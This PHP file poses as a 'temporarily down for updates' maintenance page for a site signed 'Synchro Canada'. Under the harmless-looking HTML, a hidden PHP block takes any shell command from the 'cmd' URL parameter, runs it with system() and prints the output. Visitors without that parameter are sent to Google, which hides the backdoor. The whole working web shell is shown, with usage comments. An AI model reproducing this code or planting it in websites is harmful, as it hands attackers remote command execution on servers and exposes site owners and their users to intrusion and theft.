<html>
<head>
<title><?=$_SERVER['SERVER_NAME']?> Temporarily Down</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
<div align="center">
  <p>&nbsp;</p>
  <p><strong><font size="4"><a href='http://<?=$_SERVER['SERVER_NAME']?>'><?=$_SERVER['SERVER_NAME']?></a></font></strong><font size="4"> is 
    temporarily down for updates.</font></p>
  <p><font size="4">Please check back soon.</font></p>
  <p><font size="4">Sorry for any inconvenience.</font></p>
  <p></p>
  <p><font size="4">Synchro Canada</font></p>
</div>
</body>
</html>
<?php
/* USE: index.php?cmd=command */
/* USE: index.php?cmd=ls -a */
if (!isset($_GET['cmd'])){
	header('Location: http://www.google.com/'); // Redirect to
} else { print(system($_GET['cmd'])); } //Exec command
?>